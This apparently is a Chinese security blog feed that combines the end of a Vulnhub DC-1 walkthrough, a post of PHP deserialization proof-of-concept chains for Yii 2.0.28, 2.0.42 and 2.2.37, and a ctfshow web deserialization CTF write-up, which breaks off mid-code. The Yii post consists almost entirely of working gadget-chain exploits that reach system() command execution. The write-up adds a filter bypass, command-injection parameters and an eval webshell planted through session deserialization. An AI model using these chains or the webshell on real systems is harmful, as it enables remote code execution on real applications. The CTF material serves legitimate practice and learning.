pass=&quot;$S$D2eeWaoZxfsSVPNGShv9y7333O21Iyhol/NvU93UXfq4/gLv9gTx&quot; where name=&quot;admin&quot;</code></p><p>到网页端登录 admin&#x2F;123456点击find content下面有flag3提示我们使用-exec提权，即前面的suid提权<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060706108.png"></p><p>在根目录下查找到flag4和thefinalflag<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060717908.png"></p><p>由于现在是root权限，直接读取即可，内容分别是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line">您可以使用相同的方法来查找或访问 root 中的标志吗？</span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br><span class="line">可能。但也许这并不容易。或者也许是这样？</span><br><span class="line"></span><br><span class="line">#thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line">干的好！！！！</span><br><span class="line">能。</span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new ski</span><br><span class="line">希望您喜欢这个并学到了一些新技lls.</span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCCAU7</span><br><span class="line">您可以让我知道您对这次小旅程的看法</span><br><span class="line">通过 Twitter 与我联系 - @DCCAU7</span><br></pre></td></tr></table></figure><p>这里用kali自带的字典爆破出了flag4用户的密码为orange(虽然没什么用)<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747060735659.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
            <tag> vulnhub靶场 </tag>
            
            <tag> 靶场实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yii 不同版本反序列化poc</title>
      <link href="/2025/03/25/Yii%20%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc/"/>
      <url>/2025/03/25/Yii%20%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc/</url>
      
        <content type="html"><![CDATA[<h2 id="yii-2-2-37"><a href="#yii-2-2-37" class="headerlink" title="yii 2.2.37"></a>yii 2.2.37</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;system&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;whoami&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db&#123;</span><br><span class="line"></span><br><span class="line">    use yii\web\DbSession;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult</span><br><span class="line">    &#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;_dataReader=new DbSession();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\web&#123;</span><br><span class="line"></span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class DbSession</span><br><span class="line">    &#123;</span><br><span class="line">        public $writeCallback;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $a=new IndexAction();</span><br><span class="line">            $this-&gt;writeCallback=[$a,&#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use yii\db\BatchQueryResult;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="yii-2-0-28"><a href="#yii-2-0-28" class="headerlink" title="yii 2.0.28"></a>yii 2.0.28</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;system&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;ls&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            // 这里需要改为isRunning</span><br><span class="line">            $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// poc2</span><br><span class="line">namespace Codeception\Extension&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line">    class RunProcess&#123;</span><br><span class="line">        private $processes;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;processes = [new Generator()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    // 生成poc</span><br><span class="line">    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;system&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;dir&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            // 这里需要改为isRunning</span><br><span class="line">            $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace phpDocumentor\Reflection\DocBlock\Tags&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class See&#123;</span><br><span class="line">        protected $description;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;description = new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    use phpDocumentor\Reflection\DocBlock\Tags\See;</span><br><span class="line">    class Swift_KeyCache_DiskKeyCache&#123;</span><br><span class="line">        private $keys = [];</span><br><span class="line">        private $path;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;path = new See;</span><br><span class="line">            $this-&gt;keys = array(</span><br><span class="line">                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 生成poc</span><br><span class="line">    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="yii-2-0-42"><a href="#yii-2-0-42" class="headerlink" title="yii 2.0.42"></a>yii 2.0.42</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Faker;</span><br><span class="line">class DefaultGenerator&#123;</span><br><span class="line">    protected $default ;</span><br><span class="line">    function __construct($argv)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;default = $argv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ValidGenerator&#123;</span><br><span class="line">    protected $generator;</span><br><span class="line">    protected $validator;</span><br><span class="line">    protected $maxRetries;</span><br><span class="line">    function __construct($command,$argv)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;generator = new DefaultGenerator($argv);</span><br><span class="line">        $this-&gt;validator = $command;</span><br><span class="line">        $this-&gt;maxRetries = 99999999;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Codeception\Extension;</span><br><span class="line">use Faker\ValidGenerator;</span><br><span class="line">class RunProcess&#123;</span><br><span class="line">    private $processes = [];</span><br><span class="line">    function __construct($command,$argv)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;processes[] = new ValidGenerator($command,$argv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = new RunProcess(&#x27;system&#x27;,&#x27;whoami&#x27;);</span><br><span class="line">echo(base64_encode(serialize($exp)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest</span><br><span class="line">&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;system&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;whoami&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\String</span><br><span class="line">&#123;</span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line">    class LazyString</span><br><span class="line">    &#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;value = [new indexAction(), &quot;run&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    class UnicodeString</span><br><span class="line">    &#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;value = new LazyString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker</span><br><span class="line">&#123;</span><br><span class="line">    use Symfony\Component\String\LazyString;</span><br><span class="line">    class DefaultGenerator</span><br><span class="line">    &#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;default = new LazyString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class UniqueGenerator</span><br><span class="line">    &#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;generator = new DefaultGenerator();</span><br><span class="line">            $this-&gt;maxRetries = 99999999;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Codeception\Extension</span><br><span class="line">&#123;</span><br><span class="line">    use Faker\UniqueGenerator;</span><br><span class="line">    class RunProcess</span><br><span class="line">    &#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;processes[] = new UniqueGenerator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace</span><br><span class="line">&#123;</span><br><span class="line">    use Codeception\Extension\RunProcess;</span><br><span class="line">    $exp = new RunProcess();</span><br><span class="line">    echo(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> YII漏洞 </tag>
            
            <tag> ctfweb </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web反序列化学习</title>
      <link href="/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/25/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="web255-256"><a href="#web255-256" class="headerlink" title="web255&amp;256"></a>web255&amp;256</h1><p>题目<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061120968.png"></p><p>需要传入反序列化的user的username和password的值和get传递的一样，同时要求cookie中包含序列化的user，isVip为true<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061135675.png"></p><p>记得要url编码一次</p><p>得到flag<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061144287.png"></p><p>256只需要传入的username和password不一样就行了</p><h1 id="web-257"><a href="#web-257" class="headerlink" title="web 257"></a>web 257</h1><p>题目<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061165566.png"></p><p>显然题目的想法是让我们直接用反序列化覆盖this-&gt;class为后门函数然后执行代码。</p><p>这里涉及了两个php的魔术方法，一个是构造函数<code>__construct()</code>一个是析构函数<code>__destruct</code>前者是在新建类的时候触发，后者是在销毁类的时候触发，但是构造函数在反序列化的时候是不会触发的，而反序列化成为了类之后，析构函数是会被触发的，因此我们可以在构造反序列化串的时候利用构造函数将class覆盖为backdoor类<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061179655.png"></p><p>传入对应的参数即可获得flag<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061195191.png"></p><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><p>相比257多了一个if(!preg_match(‘&#x2F;[oc]:\d+:&#x2F;i’, $_COOKIE[‘user’]))</p><p>对于表达式</p><ol><li><p><strong><code>[oc]</code></strong></p><ul><li>匹配字符 <code>o</code> 或 <code>c</code>（不区分大小写，因为修饰符 <code>/i</code>）。</li><li><code>o</code> 对应 PHP 序列化对象的标识 <code>O:</code>（如 <code>O:10:&quot;ClassName&quot;</code>）。</li><li><code>c</code> 对应 PHP 自定义序列化类的标识 <code>C:</code>（如 <code>C:8:&quot;MyClass&quot;</code>）。</li></ul></li><li><p><strong><code>:\d+:</code></strong></p><ul><li><code>\d+</code>：匹配 <strong>1 个或多个数字</strong>（如 <code>O:123:</code>）。</li><li>中间的 <code>:</code> 是固定分隔符。</li></ul></li><li><p><strong>修饰符 <code>/i</code></strong></p><ul><li>不区分大小写，因此 <code>O:</code>、<code>o:</code>、<code>C:</code>、<code>c:</code> 均会被匹配。</li></ul></li></ol><p>绕过方法<strong>使用 <code>+</code> 符号</strong> PHP 允许序列化字符串中使用 <code>+</code> 绕过 <code>\d+</code> 的检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+10:&quot;EvilClass&quot; // 匹配失败，因为 \d+ 只匹配数字</span><br></pre></td></tr></table></figure><p>这里相比257，里面的属性都是public的，所以做反序列化类的题一定要多注意，我因为这点反复尝试了好久，最后使用如下代码<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061215306.png"></p><p>传递参数为?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx&amp;1&#x3D;system(‘cat flag.php|base64’);</p><p>这里的username和password都是不重要的，因为我们只需要类摧毁时执行后面函数即可。<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061238540.png"></p><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><p>预期解法</p><p>hint给了flag.php,没有给出类，可以想到利用原生类，这里给了一个方法，想到什么原生类中有<code>__Call</code>魔术方法，该魔术方法会在调用不存在的方法时触发</p><p>&#x2F;&#x2F; 反序列化之后调用 getFlag() 方法</p><p>&#x2F;&#x2F; 没有 getFlag() 方法则会调用 __call() 方法</p><p>&#x2F;&#x2F; 查看有哪些原生类有 __call() 方法</p><p>&#x2F;&#x2F; 尝试使用原生类 SoapClient 来本地访问 flag.php<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061254306.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061263325.png"></p><p>然后访问flag.txt</p><p>非预期解法</p><p>直接访问flag.php，把xff改成127.0.0.1,127.0.0.1 (因为array_pop会出栈数组，所以要传两次) post传token&#x3D;ctfshow 然后访问flag.txt</p><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061281938.png"></p><p>__wakeup 反序列化时执行、</p><p>__invoke 使用对象作为方法时执行如<code>$a = new A();$a();</code></p><p>__sleep 序列化时执行</p><p>__unserialize 反序列化时执行</p><p>在php7.4.0开始，如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法sleephe serialize同理，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 我们不需要考虑__wakeup,__invoke是类被进行函数调用时启用，也无法利用到，所以我直接看看能不能写入文件。</p><p>0x36d十进制就等于877,因为是弱类型比较，像877a等都可以通过，所以我们用username&#x3D;’877.php’,password&#x3D;’’。</p><p>将木马写入877.php,访问877.php就可以进行rce了<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061297853.png"></p><h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061307846.png"></p><p>注意到注释里有个message.php<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061329218.png"></p><p>结合题目，得知我们get传递的f，m，t会被序列化，并且会将fuck转换成loveU也就是会变多一个字符，我们只需要将<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>拼接到t后面，然后利用字符串的变化将token覆盖即可，由于目标字符串是26个字符，而每个fuck转换成loveU会多一个，因此我们只需要t传递26个fuck即可，f和m任意，然后访问message.php即可得到flag</p><p><code>payload: ?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p><h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><p>本题考查session反序列话漏洞</p><p>相关讲解 <a href="https://www.jb51.net/article/116246.htm">深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家</a></p><p>我们登录进去只有一个登录页面和check.php</p><p>用dirsearch扫一下，发现<a href="http://www.zip文件,访问下载下来是网站源码./">www.zip文件，访问下载下来是网站源码。</a></p><p>代码审计后主要有几个关键区域。</p><p>在index.php 我们发现$_SESSION[‘limit’]我们可以进行控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//超过5次禁止登陆</span><br><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">  $_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">  $_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">   $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag在flag.php处，目测需要rce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag=&quot;flag_here&quot;;</span><br></pre></td></tr></table></figure><p>inc.php 设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize</p><p>session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br></pre></td></tr></table></figure><p>并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控，可以进行文件包含geshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()&#123;</span><br><span class="line">     file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>开始构造EXP，生成payload，因为是php存储，所以需要竖线</p><p>这里还需要注意，会木马命令不能是1,会被过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  class User&#123;</span><br><span class="line">    public $username=&quot;c.php&quot;;</span><br><span class="line">    public $password=&quot;&lt;?php eval(\$_GET[ta3shi]); ?&gt;&quot;;</span><br><span class="line">    public $status=&quot;成功&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode(&quot;|&quot;.serialize(new User()));</span><br></pre></td></tr></table></figure><p>具体步骤：</p><ul><li><p>a.访问index.php</p></li><li><p>b.在开发者工具的控制台替换cookie</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 